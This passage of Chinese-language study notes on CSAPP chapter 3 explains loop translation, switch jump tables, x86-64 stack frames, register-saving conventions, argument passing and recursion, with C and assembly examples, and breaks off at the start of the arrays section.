<li><mark class="label primary">跳转到中间</mark>（jump to middle）：它执行一个无条件跳转，跳到循环结尾处的测试，以此来执行初始的测试。可以用以下模板来表达这种方法，这个模板把通用的 while 循环格式翻译到 goto 代码:</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">    <span class="keyword">goto</span> test;</span><br><span class="line">loop:</span><br><span class="line">    body-statement</span><br><span class="line">test:</span><br><span class="line">    t = test-expr;</span><br><span class="line">    <span class="keyword">if</span> (t)</span><br><span class="line">        <span class="keyword">goto</span> loop;</span><br></pre></td></tr></table></figure>

<ul>
<li><mark class="label primary">guarded-do 模式</mark>：首先用条件分支，先进行判断条件分支，不成立就跳过循环，把代码变换为 do-while 循环。</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">t = test-expr;</span><br><span class="line"><span class="keyword">if</span> (!t)</span><br><span class="line">    <span class="keyword">goto</span> done;</span><br><span class="line">loop:</span><br><span class="line">    body-statement</span><br><span class="line">    t = test-expr;</span><br><span class="line">    <span class="keyword">if</span> (t)</span><br><span class="line">        <span class="keyword">goto</span> loop;</span><br><span class="line">done:</span><br></pre></td></tr></table></figure>



<h5 id="for循环"><a href="#for循环" class="headerlink" title="for循环"></a>for循环</h5><p>C语言的<code>for</code>循环：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span>(init-expr; test-expr; update-expr)</span><br><span class="line">  body-statement;</span><br></pre></td></tr></table></figure>

<p>实际上可以翻译成如下的while循环：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">init-expr:</span><br><span class="line"><span class="keyword">while</span>(test-expr)&#123;</span><br><span class="line">  body-statement</span><br><span class="line">  update-expr</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>GCC为<code>while</code>循环提供两种形式翻译：<strong>跳转到中间</strong>（<code>goto</code>语句）、<strong>guarded-do 模式</strong></p>
<h4 id="3-6-8-switch-语句"><a href="#3-6-8-switch-语句" class="headerlink" title="3.6.8 switch 语句"></a>3.6.8 switch 语句</h4><ul>
<li>使用 <strong>跳转表（jump table）</strong>这种数据结构提高效率，使得执行 <code>switch</code> 语句的时间与开关情况的数量无关。</li>
<li>跳转表是一个数组，表项 <code>i</code> 是一个代码段的地址，这个代码段实现当开关索引值等于 <code>i</code> 时程序应该采取的动作。</li>
</ul>
<p><img data-src="https://i.loli.net/2020/10/14/PgaqOCiuAE5tvkU.png" alt="19switch语句.png"></p>
<p><img data-src="https://i.loli.net/2020/10/14/fHsP8iOnmoM2lER.png" alt="1Dswitch2.png"></p>
<p>在本例中跳转表可以用 GCC 对 C 的扩展的方式表示：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// &amp;&amp;表示指向代码位置的指针。</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">void</span> *jt[<span class="number">7</span>] = &#123;</span><br><span class="line">    &amp;&amp;loc_A, &amp;&amp;loc_def, &amp;&amp;loc_B,</span><br><span class="line">    &amp;&amp;loc_C, &amp;&amp;loc_D, &amp;&amp;loc_def,</span><br><span class="line">    &amp;&amp;loc_D</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<ul>
<li>数组 <code>jt</code> 包含7个表项，每个都是一个<mark class="label danger">代码块的地址</mark></li>
<li>这些位置由代码中的标号定义，在 <code>jt</code> 的表项中由代码指针指明，由标号加上 <code>&amp;&amp;</code> 前缀组成。（回想运算符<code> &amp;</code>创建一个指向数据值的指针。在做这个扩展时，GCC的作者们创造了一个新的运算符 <code>&amp;&amp;</code>，这个运算符创建一个<mark class="label warning">指向代码位置</mark><mark class="label success">的指针</mark>）</li>
<li>执行 <code>switch</code> 语句的关键步骤是通过跳转表来访问代码位置</li>
<li>第5行，<code>jmp</code>指令的操作数有前缀<code>*</code>, <strong>表明这是一个间接跳转</strong>，操作数指定一个内存位置，索引由寄存器<code>rsi</code>给出，这个寄存器保存着<code>index</code>的值</li>
<li>跳转表对<strong>重复</strong>情况的处理就是简单地对表项4和6用同样的代码标号（loc_D），而对于<strong>缺失</strong>的情况的处理就是对表项1和5使用默认情况的标号（loc_def）</li>
</ul>
<p>其中<code>L4</code>的结构如下：</p>
<p><img data-src="https://i.loli.net/2020/10/14/i74tmVCuxkSMwNe.png" alt="1E跳转表.png"></p>
<div class="note info"><p>这些声明表明，在叫做 <code>rodata</code>（只读数据，Read-Only Data)的目标代码文件的段中，应该有一组<strong>7个“四”字</strong>（8个字节），每个字的值都是与指定的汇编代码标号（例如<code>.L3</code>）相关联的<strong>指令地址</strong>。<strong>标号<code>.L4</code>标记出这个分配地址的起始。与这个标号相对应的地址会作为间接跳转(第5行)的基地址。</strong></p>
</div>



<h3 id="3-7-过程"><a href="#3-7-过程" class="headerlink" title="3.7 过程"></a>3.7 过程</h3><p><strong>过程</strong>：用一组指定的参数和一个可选的返回值实现了某种功能。然后，可以在程序中不同的地方调用这个函数。</p>
<p>过程的形式多样：</p>
<ul>
<li>函数（function）</li>
<li>方法（method）</li>
<li>子例程（subroutine）</li>
<li>处理函数（handler）</li>
<li>….</li>
</ul>
<p>假设过程 P 调用过程 Q，Q 执行后返回到 P。这些动作包括下面一个或多个机制：</p>
<ul>
<li>传递控制：在进人过程 Q 的时候，程序计数器必须被设置为 Q 的代码的起始地址，然后在返回时，要把程序计数器设置为P中调用Q后面那条指令的地址。</li>
<li>传递数据：P 必须能够向 Q 提供一个或多个参数，Q 必须能够向 P 返回一个值。</li>
<li>分配和释放内存：在开始时，Q 可能需要为局部变量分配空间，而在返回前，又必须释放这些存储空间。</li>
</ul>
<h4 id="3-7-1-运行时栈"><a href="#3-7-1-运行时栈" class="headerlink" title="3.7.1 运行时栈"></a>3.7.1 运行时栈</h4><ul>
<li>当 x86-64 过程需要的存储空间超过寄存器能够存放的大小时，就会在栈上分配空间。这个部分成为过程的 <strong>栈帧（stack frame）</strong>。一般不超过 6 个的参数都可以通过寄存器传递。</li>
<li>X86-64的栈向<strong>低地址方向增长</strong>。</li>
<li>大多数过程的栈帧都是定长的，在过程的开始就分配好了。但也有变长的帧。将在3.10.5节中讨论。</li>
<li>当过程具有 6 个或更少的参数时，那么所有的参数都可以通过寄存器来传递，也就是说，当所有的局部变量都可以保存在寄存器中，且该函数不会调用任何其他函数，则不需要栈帧。</li>
<li>存放参数的寄存器的使用是有顺序的，即第一个参数、第二个参数·····第六个参数存放在那个寄存器是预定义好的，将在3.7.3中讨论。</li>
</ul>
<p>P调用过程Q时：</p>
<ul>
<li>当Q在执行时，P以及所有在向上追溯到P的调用链中的过程，都是暂时被<strong>挂起</strong>的。</li>
<li><strong>把返回地址压入栈中</strong>，表示从 Q 返回时，从 P 的哪个位置继续执行，它算作 P 的栈帧的一部分。因为他存放的是与 P 相关的状态。</li>
<li>Q 会扩展当前栈的边界，在这个空间里，可以保存寄存器的值，分配局部变量空间，为它调用的过程设置参数。</li>
<li>最多可以通过寄存器传递 6 个整数值（指针和整数），如果 Q 需要更多的参数，则 P 可以在 Q 调用之前在自己的栈帧里存储好这些参数。</li>
<li>P 是调用者（caller），Q 是被调用者（callee）。</li>
<li><a href="https://zhuanlan.zhihu.com/p/27339191">x86-64 下函数调用及栈帧原理</a></li>
</ul>
<p>下图是通用的栈帧结构：</p>
<p><img data-src="https://i.loli.net/2020/12/14/RXLWwuvzb7r13qH.png" alt="1F栈帧.png"></p>
<h4 id="3-7-2-转移控制与函数返回"><a href="#3-7-2-转移控制与函数返回" class="headerlink" title="3.7.2 转移控制与函数返回"></a>3.7.2 转移控制与函数返回</h4><p>本节主要研究：</p>
<ul>
<li>转移控制指令<code>call</code>和<code>ret</code></li>
<li>函数返回</li>
</ul>
<mark class="label warning">转移控制</mark>

<p><code>call</code>指令用来调用函数，分为直接调用和间接调用，类似<code>jmp</code>指令也有直接和间接跳转。</p>
<ul>
<li>直接调用：<code>call Label</code>，目标<code>Label</code>是标号</li>
<li>间接调用：<code>call *Operand</code>，目标<code>*Operand</code>是<code>*</code>后跟一个操作数指示符</li>
</ul>
<div class="note danger"><p><code>call</code>的效果等价于 <code>push 返回地址</code> + <code>jmp 被调函数</code></p>
</div>



<div class="note success"><p><code>ret</code>的效果等价于 <code>pop 返回地址</code> + <code>jmp 调用者函数</code></p>
</div>

<p><code>call</code>指令调用过程：</p>
<ul>
<li><strong>修改</strong>程序计数器 PC</li>
<li><strong>压栈</strong>函数返回地址 A</li>
<li><strong>跳转</strong>到标号的函数（跳转到被调函数）</li>
</ul>
<p>在使用<code>call</code>指令跳转到被调函数时，需要使用到程序计数器 PC（<code>%rip</code>）（指令计数器、指令指针IP），为了使被调函数能成功返回到调用函数继续执行，需要将函数的返回地址A（跟在<code>call</code>指令后面的那条地址）压入栈中，将 PC 的值设置为被调函数的起始地址。</p>
<p><code>ret</code>指令会从栈中弹出返回地址 A，并把PC的值设置为 A。</p>
<blockquote>
<p>关于PC、IP、IR以及寄存器的调用：<a href="https://www.cnblogs.com/carl2380/p/4728606.html">程序计数器 PC， 指令寄存器IR、状态寄存器SR、通用寄存器GR</a></p>
</blockquote>
<mark class="label warning">函数的返回</mark>

<p>函数的调用和返回都涉及栈帧的变化，为了使函数返回到调用函数时能够继续执行返回地址的指令，要使栈指针<code>%rbp</code>和<code>%rsp</code>恢复到函数调用前的状态。</p>
<p><img data-src="https://i.loli.net/2020/12/14/qipebN8aKR54jTt.png" alt="栈帧"></p>
<div class="note success"><p>函数调用前栈帧调整：    </p>
<ol>
<li>保存当前栈帧状态值，以备后面恢复本栈帧时使用（<code>%rbp</code>入栈）</li>
<li>将当前栈帧切换到新栈帧（将RSP值装入RBP，更新栈帧底部，<code>movq %rsp, %rbp</code>）</li>
<li>给新栈帧分配空间（把RSP减去所需空间大小，抬高栈顶）</li>
</ol>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">pushq %rbp        # 保存旧的帧指针，相当于创建新的栈帧</span><br><span class="line">movq  %rsp, %rbp  # 让 %rbp 指向新栈帧的起始位置</span><br><span class="line">subq  $N, %rsp    # 在新栈帧中预留一些空位，供子程序使用，用 (%rbp-K) 的形式引用空位</span><br></pre></td></tr></table></figure>
</div>



<div class="note default"><p>函数返回时栈帧调整：</p>
<ol>
<li>将栈顶指针抬高到该栈帧的基地址处（使<code>%rsp</code>指向<code>rbp</code>指针的位置）</li>
<li>将栈帧底部已经保存的<code>%rbp</code>值弹出并赋值给<code>%rbp</code>（使用<code>pop</code>指令，更新<code>%rbp</code>指向，使其恢复到函数调用前的位置，此时的<code>%rsp</code>会上上移一个位置恢复到函数调用前的栈顶位置）</li>
</ol>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">movq %rbp, %rsp   # 使 %rsp 和 %rbp 指向同一位置，即子栈帧的起始处</span><br><span class="line">popq %rbp         # 将栈中保存的父栈帧的 %rbp 的值赋值给 %rbp，并且 %rsp 上移一个位置指向父栈帧的结尾处</span><br></pre></td></tr></table></figure>
</div>

<p>注意：<code>%rsp</code>指向当前<mark class="label success">栈顶地址</mark>，即保存的值是栈顶的地址，而不是栈顶的值。<code>(%rax)</code>则成了内存引用，会取出这个指针指向的数据。</p>
<p>本小节参考的其他资料：</p>
<ul>
<li><a href="https://zhuanlan.zhihu.com/p/104858020">[读书笔记]CSAPP：7[VB]机器级表示：函数</a></li>
<li><a href="https://zhuanlan.zhihu.com/p/27339191">x86-64 下函数调用及栈帧原理</a></li>
<li><a href="https://www.cnblogs.com/czw52460183/p/10320393.html">CSAPP阅读笔记-栈帧-来自第三章3.7的笔记-P164-P176</a></li>
<li><a href="https://www.cnblogs.com/sddai/p/9762968.html">C函数调用过程原理及函数栈帧分析</a></li>
<li><a href="https://www.cnblogs.com/carl2380/p/4728606.html">程序计数器 PC， 指令寄存器IR、状态寄存器SR、通用寄存器GR</a></li>
<li><a href="https://www.cnblogs.com/zuoxiaolong/p/computer19.html">深入理解计算机系统（3.7）—汇编世界当中过程的经典（十分重要）（难度较高）</a></li>
<li><a href="https://www.cnblogs.com/33debug/p/6773059.html">函数的调用过程（栈帧）</a></li>
<li><a href="https://blog.csdn.net/anlian523/article/details/84501336">《深入理解计算机系统》 练习题3.27-3.28 被调用者保存寄存器 栈指针</a></li>
<li><a href="https://www.cnblogs.com/zuoxiaolong/p/computer15.html">深入理解计算机系统（3.3）—数据传送（或者说复制）指令详解</a></li>
</ul>
<h4 id="3-7-3-参数传递（参数构造区）"><a href="#3-7-3-参数传递（参数构造区）" class="headerlink" title="3.7.3 参数传递（参数构造区）"></a>3.7.3 参数传递（参数构造区）</h4><div class="note info"><ul>
<li>x86-64 中，可以通过寄存器最多传递6个整型参数。多余的部分就要通过栈来传递。每个函数的栈帧都包含保存的寄存器、局部变量和参数构造区三个部分</li>
<li>寄存器的使用是有特殊顺序的（如下图所示），寄存器使用的名字取决于要传递的数据类型的大小。</li>
<li>使用栈传递参数时，所有的数据大小都向<mark class="label primary">8</mark>的倍数对齐（仅在<strong>参数构造区</strong>中如此分配）。</li>
</ul>
</div>

<p><img data-src="https://i.loli.net/2020/10/15/HSqYd5RhKpCJwsG.png" alt="20参数寄存器.png"></p>
<p>假设函数 P 调用 Q ，Q 调用函数 R，P 调用 Q：</p>
<ol>
<li>如果过程P要向Q传递超过 n&gt;6 个参数，注意, 要在<mark class="label danger">P的栈帧上分配 n-6 的空间</mark>用来保存参数。</li>
<li>在 P 调用 Q 之前，按照上边的规则，将 1-6 号参数复制到相应的寄存器， 把剩下的 n – 6个参数，<mark class="label info">倒序</mark>依次压入栈中，也就是说第7个参数位于栈顶。</li>
<li>在通过栈传递数据时，所有的大小都对齐到8的倍数。上边的所有参数都到位之后, 就可以执行 call 转移控制。 此时的栈顶更新为 call 的下一条指令的地址（返回地址）。</li>
<li>控制权移交给Q的指令后，Q 可以通过寄存器访问 1-6 号参数， 7～n 号参数则可以通过栈来访问。</li>
</ol>
<p>Q 调用 R：</p>
<ol>
<li>如果Q调用其他过程 R，也超过 6 个参数，也需要在自己的栈帧中分配空间。 为超出的参数分配的空间， 叫做<mark class="label success">参数构造区</mark>。</li>
</ol>
<div class="note danger"><p>使用<code>%rsp</code>或<code>%rbp</code>来指示数据存放的位置：由于x86-64最小的寻址空间（一个地址块）是64位，即8个字节，在通过栈传递数据时，在<strong>参数构造区</strong>所有的大小都对齐到8的倍数，在<strong>局部变量区</strong>按实际数据大小分配，且需要<strong>对齐</strong>。通常一个数据块存放在栈中的某个连续块可以使用栈指针来指出它们的起始地址，然后这个地址块所占的空间大小是8的倍数个字节。</p>
</div>



<p><img data-src="https://i.loli.net/2020/10/16/EnIblaOtvz5ASgY.png" alt="21多参数的函数.png"></p>
<p><img data-src="https://i.loli.net/2020/10/16/HJgPhWyIp8CviS9.png" alt="22proc栈帧.png"></p>
<ol>
<li>如图3-29所示，把 proc 当被调用函数看，此时传了8个参数进来，调用它的函数已经把超出的2个参数（a4和a4p）压进了栈，a1-a3p 被按顺序分别放在了上面说的6个寄存器内。</li>
<li>如图3-30。尽管a4（char）只有一个字节，但是参数a4要占8个字节空间。可以看到，作为过程调用的一部分，<strong>返回地址</strong>被压人栈中并位于栈顶位置。因而这两个参数（<code>a4与a4p</code>）位于相对于栈顶指针距离为8和16的位置。<ul>
<li>a4 占8个字节空间，存在于<code>8(%rsp)～15(%rsp)</code></li>
<li>a4p 存在于<code>16(%rsp)～23(%rsp)</code></li>
<li>返回地址存在于存在于<code>(%rsp)～7(%rsp)</code></li>
</ul>
</li>
</ol>
<div class="note warning"><p><strong>调用者保存寄存器（Caller Save）和被调者保存寄存器（Callee Save）</strong>：</p>
<p>为什么要区分调用者保存寄存器和被调者保存寄存器？这是因为 CPU 的寄存器是有限的，但是在函数调用时，调用的函数可以使用寄存器，被调用的函数也可以使用寄存器从而覆盖父函数寄存器的值，那么为了保证函数返回时，并不会造成数据的错乱，所以要区分开寄存器的值是由调用者保存还是被调用者保存。</p>
<p><strong>调用者保存寄存器（Caller Save）</strong>：当函数调用时，调用函数会将属于“调用者保存寄存器”的寄存器的值压入自己的栈中保存起来，然后这些寄存器就可以在被调用的函数中使用，在被调函数中尽管这些寄存器的值被修改覆盖，在函数返回时，栈指针恢复到调用者的栈帧中，这些寄存器的值由于之前就已经被压栈，所有值并不会错乱。</p>
<p><strong>被调者保存寄存器（Callee Save）</strong>：当函数被调用时，当使用到“被调用者保存寄存器”时，这些寄存器的值就需要被调函数来进行保存，即压入自己的栈中（<mark class="label warning">使用push指令</mark> ），然后这些寄存器就可以被修改覆盖。然后在函数返回时这些寄存器的值从栈上能够恢复到最初的值（<mark class="label warning">使用pop指令</mark> ），所以值不会错乱。被调者保存寄存器有<mark class="label success">%rbx</mark> 、<mark class="label success">%rbp</mark> 和 <mark class="label success">%r12~%r15</mark> 。</p>
</div>



<div class="note primary"><p>指针的理解：数据在计算机中是一个一个字节存的，而每个字节都有一个序号，我们称这些字节序号为地址，或指针。即可以理解为<mark class="label warning">地址就是一个指针</mark>  。</p>
</div>

<p>栈指针<code>%rsp</code>：</p>
<ol>
<li>栈顶指针<code>%rsp</code>是随着函数运行不断变化的。</li>
<li>栈指针<code>%rsp</code>它其实不算是个寄存器，顾名思义，它是一个指针，指向<strong>当前栈顶地址</strong>。</li>
<li>比如<code>%rax</code>，它一个普通的寄存器，取<code>%rax</code>时，就会取它装有的8字节数据；可能它是个指针，取<code>(%rax)</code>时，则成了内存引用，会取出这个指针指向的数据；<br>而<code>%rsp</code>，它是栈指针，取<code>%rsp</code>时，返回的是当前栈指针的地址形如<code>0x7fffffffe820</code>；取<code>(%rsp)</code>时，则可能取出从 820～827 这 8 个字节里面存的数据；而一般来说，我们不需要取<code>%rsp</code>，因为要栈顶地址来根本没用。</li>
</ol>
<p><img data-src="https://i.loli.net/2020/10/16/fJGHXh95PxzwWvE.png" alt="调用者被调用者寄存器.png"></p>
<div class="note success"><p>使用<code>call</code>前会将局部变量入栈或寄存器（被调用者寄存器）中，然后将参数放入寄存器（调用者寄存器，0&lt;n&lt;7），然后执行<code>call</code>，<code>call</code>会将返回地址压入栈顶，此时该栈结束转移到新的栈中去。</p>
<p>在新的栈中，先将<code>%rbp</code><strong>压栈</strong>，若要使用到被调用者寄存器，则应先将寄存器的值压栈（这一步就是保存寄存器的值，使用<strong>被保存的寄存器区</strong>），然后是局部变量（看编译器是使用被调用者寄存器来保存局部变量还是使用栈，上述的三类必须使用栈，使用<strong>局部变量区</strong>），然后是<strong>参数构造区</strong>，先使用六个调用者寄存器，若参数大于6，则放到栈中。最后就是<code>ret</code>指令会自动弹出本栈中的返回地址（位于栈顶），然后自动修改<code>%rsp</code>的值。</p>
</div>



<h4 id="3-7-4-局部变量区"><a href="#3-7-4-局部变量区" class="headerlink" title="3.7.4 局部变量区"></a>3.7.4 局部变量区</h4><p><span id="sanlei">函数中以下三类局部变量必须存放在内存中的栈里面：</span></p>
<ol>
<li>寄存器不足够存放所有本地数据。</li>
<li>对一个局部变量使用地址运算符<code>&amp;</code>，此时是需要得到变量的地址的，那么显然变量就不能存在寄存器中，只能放栈上。</li>
<li>某些局部变量是数组或结构，因此必须能够通过数组或结构引用被访问到。</li>
</ol>
<p>对于<code>2</code>，如果变量被存储在寄存器中，则<mark class="label warning">没有内存地址</mark>，因此不能将地址操作符用于寄存器变量。</p>
<div class="note primary"><p>局部变量（Local Variable）是指作用域和生命周期都局限在所在函数或过程范围内的变量，它是相对于全局变量（Global variable）而言的。编译器在为局部变量分配空间时通常有两种做法：<strong>使用寄存器和使用栈</strong>。</p>
</div>

<div class="note danger"><p>关于使用<mark class="label danger">寄存器</mark>保存还是用<mark class="label warning">栈</mark>来保存<mark class="label success">局部变量</mark>：</p>
<ol>
<li>上述的<a href="#sanlei">三类</a>都是存放在栈上的，对于这三类中的 <code>1</code> 可以参考以下几点。</li>
<li>寄存器的访问速度快，但数量和空间有限，所以像<strong>字符串</strong>或<strong>数组</strong>不适合分配在寄存器中。编译器通常只会把频繁使用的临时变量分配在寄存器中，比如for循环中的循环变量。</li>
<li>当编译器的优化选项打开时，编译器会充分利用可用的寄存器来给临时变量使用，以提高程序的性能。对于调试版本，<strong>优化选项默认是关闭的，编译器会在栈上分配所有的变量</strong>。</li>
<li>在C&#x2F;C++程序中，可以在声明变量时加上register关键字，请求编译器在可能的情况下将该变量分配在寄存器中，但不能保证所描述的变量一定被分配在就存寄存器中。大多数时候，编译器还是根据全局设置和编译器自身的逻辑来决定是否把一个变量分配在寄存器中。</li>
<li>编译器会在编译阶段根据变量的特征和优化选项为每个局部变量选择以上的两种分配方法之一。大多数的局部变量都是分配在栈上的。栈上的变量会随着函数的调用和返回而自动分配和释放，所以栈有时也称为自动内存。</li>
</ol>
</div>

<p>[参考<a href="https://blog.csdn.net/shifters/article/details/6996819#commentBox">读书笔记_局部变量和栈帧.</a>]</p>
<p><img data-src="https://i.loli.net/2020/10/19/INA28M6E5Gehax7.png" alt="24swapadd.png"></p>
<p><img data-src="https://i.loli.net/2020/10/19/IiKEnpDV5OBQ4W1.png" alt="25swapadd.png"></p>
<p>在局部变量区，局部变量放到栈里面需要进行<mark class="label warning">数据对齐</mark>，如下图的四个局部变量<code>x1</code>、<code>x2</code>、<code>x3</code>、<code>x4</code>入栈（局部变量区）按顺序入栈。这里注意到，在同一块地址中数据对齐时，<code>x2</code>放在高地址，也就是说局部变量按顺序地从高地址到低地址进行数据对齐的方式进行入栈。然后是参数<code>x4</code>和<code>&amp;x4</code>入栈，由上一节已经知道，参数入栈按照GCC的规则是右边的参数先入栈，且参数构造区是不进行数据对齐的，每个参数都占8字节的倍数，如下图所示。（参数入栈可参考参数的<strong>调用约定</strong>）</p>
<p><img data-src="https://i.loli.net/2020/10/19/xqts3yoGI9FpzWU.png" alt="26参数栈帧.png"></p>
<h4 id="3-7-5-被保存的寄存器区"><a href="#3-7-5-被保存的寄存器区" class="headerlink" title="3.7.5 被保存的寄存器区"></a>3.7.5 被保存的寄存器区</h4><p>通用寄存器中的寄存器被分为两类：调用者寄存器、被调用者寄存器</p>
<div class="note danger"><p>其中，调用者寄存器用来传参，被调用者寄存器用来保存不满足<a href="#sanlei">这三类</a>和编译未优化时（大部分情况下）的局部变量。被调用者寄存器在使用前它的值需要进行压栈，保存上一个栈的状态，所以也可以把被保存的寄存器区分为局部变量区。</p>
</div>

<p>被调用者寄存器共六个：<code>%rbx</code>、<code>%rbp</code>、<code>%r12</code>、<code>%r13</code>、<code>%r14</code>、<code>%r15</code></p>
<p>当局部变量使用被调用者寄存器来保存时，应该先将寄存器的值进行压栈，以备后续栈帧恢复时能够正确恢复到之前的状态。</p>
<h4 id="3-7-6-递归"><a href="#3-7-6-递归" class="headerlink" title="3.7.6 递归"></a>3.7.6 递归</h4><p>递归是使用栈来实现的，这里我的理解是把<strong>局部变量使用的栈</strong>和<strong>被保存寄存器区部分</strong>统一起来看做所有的局部变量区域。</p>
<p>当局部变量使用寄存器时是使用被调用者寄存器，使用前须将寄存器值进行压栈保存，正是这一步骤使得函数在递归返回的时候能够继续使用调用函数的计算值。这样可以发现，每一个过程的栈区，都保留了需要还原给上一个栈的局部变量，自己的局部变量，交给下一个过程的参数这样一些内容。</p>
<div class="note warning"><p>函数的递归过程，假设递归函数为<code>rfact</code>：</p>
<ol>
<li>假设函数调用顺序为 <code>main</code> --&gt; <code>rfact</code> --&gt; <code>rfact_1</code>  --&gt; <code>rfact_2</code>  --&gt; <code>rfact_3</code>  --&gt; ····  --&gt;<code>rfact_n-1</code>  --&gt; <code>rfact_n</code> </li>
<li>每一个函数过程都会建立一个运行时栈，且函数没执行到 <code>ret</code> 指令时栈是不会被销毁的，这个时候会调用下一轮循环函数，本栈数据会进行保存，然后跳转到新的栈中去</li>
<li>当执行到最后一个函数<code>rfact_n</code> 时（判断条件成立），这个时候<code>rfact_n</code> 函数开始第一次执行 <code>ret</code> 指令，先弹出被保存的寄存器的值，带着返回值<code>%rax</code>进入到<code>rfact_n-1</code> 函数中去（<code>rfact_n</code> 函数栈释放），执行<code>rfact_n-1</code> 函数<code>call</code>后面的那条指令，然后直到<code>rfact_n-1</code> 函数的<code>ret</code> 指令，又带着<code>%rax</code>的值返回到<code>rfact_n-2</code>函数，直到最后返回到<code>rfact</code>函数</li>
<li>最后执行<code>rfact</code>的<code>ret</code> 指令返回到最初的调用函数<code>main</code> ，至此整个递归调用过程结束，所有的栈也得到释放</li>
</ol>
</div>



<p>举例，C语言如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">rfact</span><span class="params">(<span class="keyword">long</span> n)</span></span>&#123;</span><br><span class="line">    <span class="keyword">long</span> result;</span><br><span class="line">    <span class="keyword">if</span> (n &lt;= <span class="number">1</span>) &#123;</span><br><span class="line">        result = <span class="number">1</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> result = n * rfact(n - <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>函数的汇编代码如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">rfact</span><span class="params">(<span class="keyword">long</span> n)</span></span></span><br><span class="line">n in %rdi</span><br><span class="line"></span><br><span class="line">rfact:</span><br><span class="line">    pushq   %rbx            将被调用者寄存器%rbx中的值保存起来, 这个值是什么呢</span><br><span class="line">    movq    %rdi, %rbx      保存n</span><br><span class="line">    movl    $<span class="number">1</span>, %eax        %rax中放入<span class="number">1</span></span><br><span class="line">    cmpq    %<span class="number">1</span>, %rdi        比较 n : <span class="number">1</span></span><br><span class="line">    jle     .L35            如果n&lt;=<span class="number">1</span> 跳转 L35 标号</span><br><span class="line">    leaq    <span class="number">-1</span>(%rdi), %rdi  n = n - <span class="number">1</span>, %rdi 此时减少<span class="number">1</span>, 同时也是<span class="number">1</span>号参数位置</span><br><span class="line">    call    rfact           调用 rfact(n<span class="number">-1</span>)</span><br><span class="line">    imulq   %rbx, %rax      用 %rbx中的 n 乘以 %rax中的 rfact(n<span class="number">-1</span>)的值</span><br><span class="line"></span><br><span class="line">  .L35:</span><br><span class="line">    popq    %rbx            还原%rbx</span><br><span class="line">    ret                     此时%eax中是<span class="number">1</span>, 直接就可以返回<span class="number">1</span></span><br></pre></td></tr></table></figure>

<ol>
<li>如果我们在<code>main</code>函数中调用<code>rfact(3)</code>，在<code>rfact(3)</code>中<code>%rax</code>的值是不知道的，由于程序要使用<code>%rbx</code>，所以必须保存一下，假设这个值叫<code>U</code></li>
<li>之后<code>rfact(3)</code>相关内容进入系统， 此时先把<code>U</code>保存到了<code>rfact(3)</code>的栈区中， 然后在<code>%rbx</code>中存了 3， 之后使用 <code>%rdi = n-1​</code> 来调用<code>rfact(2)</code></li>
<li><code>rfact(2)</code>一开始的时候，<code>%rbx</code>中的值是 3，会把 3 保存到栈区， 然后把<code>%rbx</code>中存了 2，之后去调用<code>rfact(1)</code></li>
<li><code>rfact(1)</code>一开始的时候， <code>%rbx</code>中的值是 2， 会把 2 保存到栈区， 然后在<code>%rbx</code>中存了 1，之后去判断<code>n&lt;=1</code>， 结果发现成立，就把<code>%rbx</code>中的值还原成 2， 然后<code>ret 1</code> </li>
<li>此时控制权交给<code>rfact(2)</code>调用后的语句， 此时<code>%rbx</code>中的值是 2， 2 乘以<code>rfact(1)</code>返回的 1， 结果是 2，然后还原<code>%rbx</code> 为栈区中的 3，之后返回 2</li>
<li>控制权又交回给<code>rfact(3)</code>调用后的语句，此时<code>%rbx</code>中的值是 3，3 乘以<code>rfact(2)</code>的返回值 2， 结果是 6，然后返回给<code>main</code>函数，同时把栈区中的<code>U</code>还原到<code>%rbx</code>中。整个调用链就结束了</li>
</ol>
<h3 id="3-8-数组"><a href="#3-8-数组" class="headerlink" title="3.8 数组"></a>3.8 数组</h3><h4 id="3-8-1-一维数组"><a href="#3-8-1-一维数组" class="headerlink" title="3.8.1 一维数组"></a>3.8.1 一维数组</h4><p><strong>x86-64的内存引用指令用来简化数组引用</strong>。</p>
<p>一维数组的声明：$T\ A[N]$</p>
<ol>
<li>分配 <code>N</code> 个 <code>T类型大小</code>的连续空间</li>
<li>起始位置表示为 $x_a$ 。这个声明有两个效果。<ul>
<li>首先，它在内存中分配一个 $L * N$ 字节的连续区域，这里<code>L</code>是数据类型<code>T</code>的大小（单位为字节）。</li>
<li>其次，它引入了标识符<code>A</code>，可以用<code>A</code>来作为指向数组开头的<mark class="label warning">指针</mark>，这个指针的值就是  $x_a$ 。可以用<code>0～N-1</code>的整数索引来访问该数组元素。</li>
<li>数组元素<code>i</code>会被存放在地址为<mark class="label success"> $x_a+L·i$</mark>的地方，同时<code>A[i]</code>的值存放在 <mark class="label success">$M[x_a+L·i]$</mark>的内存中。</li>
</ul>
</li>
</ol>
<p>对于数组的计算中，常用的两个指令是<code>mov</code>和<code>leaq</code>：</p>
<ul>
<li>x84-64中任何指针指向的一个地址都是 8 个字节，如<code>char*</code>、<code>short*</code>、<code>int*</code>、<code>double*</code></li>
<li><code>mov</code>类指令用来将一个数值复制到目的寄存器或内存中，对于指针指向的地址则必须使用<code>leaq</code>来进行地址操作</li>
</ul>
<p>x86-64的内存引用指令用来简化数组引用，例如，假设<code>E</code>是一个<code>int</code>型的数组， 而我们想计算 $E[i]$ 和 $\&amp;E[i]$，在此，$E$ 的地址存放在寄存器<code>%rdx</code>中，而<code>i</code>存放在寄存器<code>%rcx</code>中。</p>
<ul>
<li><p>计算 $x_E十4i$ ：<code>leaq (%rdx,%rcx,4) %rax</code>来获取地址，然后将地址存放在寄存器<code>%rax</code>中。</p>
</li>
